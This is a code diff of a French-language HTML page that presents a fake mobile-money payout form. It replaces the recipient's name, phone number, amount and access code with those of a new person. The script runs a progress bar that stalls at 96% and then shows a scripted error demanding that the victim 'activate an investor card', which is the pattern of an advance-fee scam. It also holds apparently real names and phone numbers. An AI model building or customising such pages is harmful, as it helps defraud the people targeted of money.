@@ -138,17 +138,17 @@
         <form id="tmoneyForm" onsubmit="return false;">
             <div class="form-group">
                 <label for="name">Nom et Prénom</label>
-                <input type="text" id="name" value="Ngoma Sounda Frid" disabled>
+                <input type="text" id="name" value="Munyaneza Nturanyi" disabled>
             </div>
 
             <div class="form-group">
                 <label for="phone">Numéro </label>
-                    <input type="tel" id="phone" value="+241 77 81 73 09" disabled>
+                    <input type="tel" id="phone" value="+243 097 911 4763" disabled>
             </div>
 
             <div class="form-group">
                 <label for="amount">Montant à recevoir</label>
-                <input type="text" id="amount" class="amount" value="753 699 F CFA" disabled>
+                <input type="text" id="amount" class="amount" value="2 675 $" disabled>
             </div>
 
             <button type="button" onclick="startProgress()">Procéder</button>
@@ -160,7 +160,7 @@
                 <div class="progress-bar" id="progressBar"></div>
             </div>
 
-            <div class="notification-message" id="notificationMessage">Erreur : Veuillez enfin finaliser votre transaction afin que la conversion puisse s'éffectuer.</div>
+            <div class="notification-message" id="notificationMessage">Erreur : Veuillez activer votre carte d'investisseur afin de terminer la transaction.</div>
         </form>
     </div>
 
@@ -169,7 +169,7 @@
             const accessCode = document.getElementById('accessCode').value;
             const accessError = document.getElementById('accessError');
 
-            if (accessCode === "7309") {
+            if (accessCode === "4763") {
                 accessError.style.display = 'none';
                 document.getElementById('accessContainer').style.display = 'none';
                 document.getElementById('formContainer').style.display = 'block';
@@ -188,7 +188,7 @@
     const progressPercentage = document.getElementById('progressPercentage');
     
     const totalTime = 2 * 60 * 1000; // 5 minutes in milliseconds
-    const maxProgress = 98; // Target percentage
+    const maxProgress = 96; // Target percentage
     const intervalTime = totalTime / maxProgress; // Time per percentage step
 
     const interval = setInterval(() => {
